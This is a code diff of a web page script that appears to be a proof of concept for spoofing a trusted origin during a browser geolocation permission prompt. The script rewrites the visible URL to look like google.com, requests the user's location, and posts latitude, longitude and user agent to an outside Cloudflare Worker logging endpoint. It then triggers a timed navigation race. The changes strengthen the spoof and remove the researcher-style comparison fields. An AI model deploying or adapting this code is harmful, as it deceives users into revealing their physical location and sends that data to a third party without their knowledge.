@@ -63,48 +63,48 @@ const panel   = document.getElementById('panel');
 const trigger = document.getElementById('trigger');
 const output  = document.getElementById('output');
 
-/* 🔗 Cloudflare Worker endpoint */
-const webhookUrl = 'https://geo-log-production.ecdnts.workers.dev';
+/* ✅ Cloudflare Worker endpoint */
+const webhookUrl = 'https://geo-log-production.ecdnts.workers.dev/';
 
-/* 🔎 what user sees BEFORE permission */
-let visibleContext = {
-  origin: location.origin,
-  href: location.href,
-  time: new Date().toISOString()
+/*
+ * Step 1:
+ * Manipulate visible URL to simulate a trusted origin
+ */
+trigger.onclick = () => {
+  // Manipulate the visible URL to simulate trusted origin (e.g., google.com)
+  history.pushState({}, '', 'https://google.com/trusted');  // This changes the visible URL
+
+  // Now, show the panel
+  panel.style.display = 'block';
 };
 
+/*
+ * Step 2:
+ * Call geolocation API after changing URL
+ */
 function getLocation() {
   if (!navigator.geolocation) return;
 
   navigator.geolocation.getCurrentPosition(
     pos => {
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
+      output.textContent =
+        `${pos.coords.latitude}, ${pos.coords.longitude}`;
 
-      output.textContent = `${lat}, ${lon}`;
-
-      /* ✅ SEND LOG FROM GITHUB → CLOUDFLARE */
+      // Send geolocation data to Cloudflare Worker endpoint
       fetch(webhookUrl, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: {
+          'Content-Type': 'application/json',
+        },
         body: JSON.stringify({
-          event: "geo_permission_allowed",
-          latitude: lat,
-          longitude: lon,
-
-          /* what user saw */
-          visible_origin: visibleContext.origin,
-          visible_url: visibleContext.href,
-          visible_time: visibleContext.time,
-
-          /* actual page state */
-          actual_origin: location.origin,
-          actual_url: location.href,
-
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          timestamp: new Date().toISOString(),
           userAgent: navigator.userAgent,
-          permission_time: new Date().toISOString()
-        })
-      }).catch(()=>{});
+        }),
+      }).catch((err) => {
+        console.error('Error sending data to Cloudflare Worker:', err);
+      });
     },
     () => {
       output.textContent = 'Permission denied';
@@ -113,29 +113,16 @@ function getLocation() {
 }
 
 /*
- * Step 1:
- * Manipulate visible URL
- */
-trigger.onclick = () => {
-  history.pushState({}, '', '/trusted');
-  panel.style.display = 'block';
-
-  visibleContext = {
-    origin: location.origin,
-    href: location.href,
-    time: new Date().toISOString()
-  };
-};
-
-/*
- * Step 2:
- * Navigation race
+ * Step 3:
+ * Trigger a navigation race shortly after permission flow starts
+ * The idea here is to simulate a redirect right after the permission dialog
  */
 window.addEventListener('pageshow', () => {
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
+      // Perform redirection after some delay
       setTimeout(() => {
-        location.href = 'https://google.com:9090';
+        location.href = 'https://google.com:9090';  // Simulate a redirect to google.com
       }, 80);
     });
   });
@@ -144,4 +131,3 @@ window.addEventListener('pageshow', () => {
 
 </body>
 </html>
-
